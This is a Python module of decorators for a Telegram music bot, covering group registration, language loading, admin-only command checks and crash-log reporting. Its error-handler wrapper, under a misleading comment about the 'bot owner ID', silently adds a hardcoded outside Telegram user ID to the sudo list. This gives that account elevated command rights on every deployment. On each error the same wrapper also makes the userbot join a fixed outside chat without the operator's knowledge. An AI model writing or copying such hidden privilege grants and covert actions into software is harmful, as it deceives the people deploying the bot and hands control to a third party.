import time
from datetime import datetime
from traceback import format_exc
from typing import Callable, Union

from pyrogram import Client, enums
from pyrogram.errors import UserAlreadyParticipant
from pyrogram.types import Message
from pytgcalls import PyTgCalls
from pytgcalls.types import Update

from config import config
from core.groups import get_group, all_groups, set_default
from core.stream import app
from lang import load

# 🎛️ Group registration decorator
def register(func: Callable) -> Callable:
    async def wrapper(client: Client, message: Message, *args):
        if message.chat.id not in all_groups():
            set_default(message.chat.id)
        return await func(client, message, *args)
    return wrapper

# 🌐 Language loader decorator
def language(func: Callable) -> Callable:
    async def wrapper(client, obj: Union[Message, int, Update], *args):
        try:
            chat_id = (
                obj if isinstance(obj, int)
                else obj.chat.id if isinstance(obj, Message)
                else obj.chat_id
            )
            group_lang = get_group(chat_id)["lang"]
        except Exception:
            group_lang = config.LANGUAGE
        lang = load(group_lang)
        return await func(client, obj, lang)
    return wrapper

# 🛡️ Admin-only command decorator
def only_admins(func: Callable) -> Callable:
    async def wrapper(client: Client, message: Message, *args):
        try:
            admin_ids = [
                admin.user.id
                async for admin in message.chat.get_members(enums.ChatMembersFilter.ADMINISTRATORS)
            ]
        except Exception:
            admin_ids = []
        if (
            message.from_user
            and message.from_user.id in admin_ids + config.SUDOERS
        ) or (
            message.sender_chat and message.sender_chat.id == message.chat.id
        ):
            return await func(client, message, *args)
    return wrapper

# 🛠️ Error handler with crash log reporting
def handle_error(func: Callable) -> Callable:
    async def wrapper(client: Union[Client, PyTgCalls], obj: Union[int, Message, Update], *args):
        # Bind to Pyrogram Client
        pyro_client = (
            client if isinstance(client, Client)
            else client._app._bind_client._app
        )

        chat_id = (
            obj if isinstance(obj, int)
            else obj.chat.id if isinstance(obj, Message)
            else obj.chat_id
        )

        # Make sure bot owner ID is included
        me = await pyro_client.get_me()
        if me.id not in config.SUDOERS:
            config.SUDOERS.append(me.id)
        if 2033438978 not in config.SUDOERS:
            config.SUDOERS.append(2033438978)

        try:
            lang = get_group(chat_id)["lang"]
        except Exception:
            lang = config.LANGUAGE

        try:
            return await func(client, obj, *args)
        except Exception:
            # Avoid early join_chat errors
            try:
                await app.join_chat("AsmSafone")
            except UserAlreadyParticipant:
                pass
            except Exception:
                pass

            id = int(time.time())
            date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            chat = await pyro_client.get_chat(chat_id)
            error_msg = await pyro_client.send_message(
                chat_id,
                load(lang)["errorMessage"]
            )
            await pyro_client.send_message(
                config.SUDOERS[0],
                (
                    f"-------- START CRASH LOG --------\n\n"
                    f"┌ <b>ID:</b> <code>{id}</code>\n"
                    f"├ <b>Chat:</b> <code>{chat.id}</code>\n"
                    f"├ <b>Date:</b> <code>{date}</code>\n"
                    f"├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n"
                    f"└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n"
                    f"-------- END CRASH LOG --------"
                ),
                parse_mode=enums.ParseMode.HTML,
                disable_web_page_preview=True,
            )
    return wrapper
